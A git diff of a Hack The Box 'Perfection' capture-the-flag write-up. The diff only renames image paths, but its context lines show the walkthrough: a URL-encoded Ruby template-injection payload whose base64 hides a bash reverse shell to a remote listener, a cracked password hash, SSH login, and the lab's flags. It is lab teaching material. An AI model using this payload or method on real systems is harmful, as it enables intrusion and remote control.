@@ -4,7 +4,7 @@
 
 This writeup details the exploitation process of the "Perfection" box on Hack The Box. The challenge is categorized as easy difficulty and involves several stages.
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Enumeration
 
@@ -14,13 +14,13 @@ This writeup details the exploitation process of the "Perfection" box on Hack Th
 nmap -A -Pn 10.10.11.253 
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 I found the website and I check all the function and I find [http://10.10.11.253/weighted-grade](http://10.10.11.253/weighted-grade)
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Curl (HEADER)
 
@@ -28,11 +28,11 @@ I found the website and I check all the function and I find [http://10.10.11.253
 curl -I 10.10.11.253
 ```
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 And intercept with burp suite to see it have potential RCE. And I found vulnerability that need to use URL-encoding. [https://www.exploit-db.com/exploits/5215](https://www.exploit-db.com/exploits/5215)
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
@@ -52,13 +52,13 @@ a%0A;<%25%3d+system("echo+IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3
 </strong><strong>;&#x3C;%= system("echo IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTYvNDQ0NCAwPiYxIgo= | base64 -d | bash") %>
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption><p>BINGO!</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption><p>BINGO!</p></figcaption></figure>
 
 ### User Flag
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption><p>99dea3053881db4616c908de8b15467d</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>99dea3053881db4616c908de8b15467d</p></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -68,7 +68,7 @@ a%0A;<%25%3d+system("echo+IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3
 strings /home/susan/Migration/pupilpath_credentials.db
 ```
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption><p>Susan Miller: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p>Susan Miller: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</p></figcaption></figure>
 
 ### Found the password format
 
@@ -77,7 +77,7 @@ cd /var/mail
 cat susan
 ```
 
-<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption><p>{firstname}<em>{firstname backwards}</em>{randomly generated integer between 1 and 1,000,000,000}</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption><p>{firstname}<em>{firstname backwards}</em>{randomly generated integer between 1 and 1,000,000,000}</p></figcaption></figure>
 
 ### Crack password:
 
@@ -96,11 +96,11 @@ PASSWORD: susan_nasus_413759210
 ssh susan@10.10.11.253 
 ```
 
-<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Root Flag
 
-<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption><p>ae84cdfdc078c0790f713ee089011b7c</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption><p>ae84cdfdc078c0790f713ee089011b7c</p></figcaption></figure>
 
 ## Follow Me
 
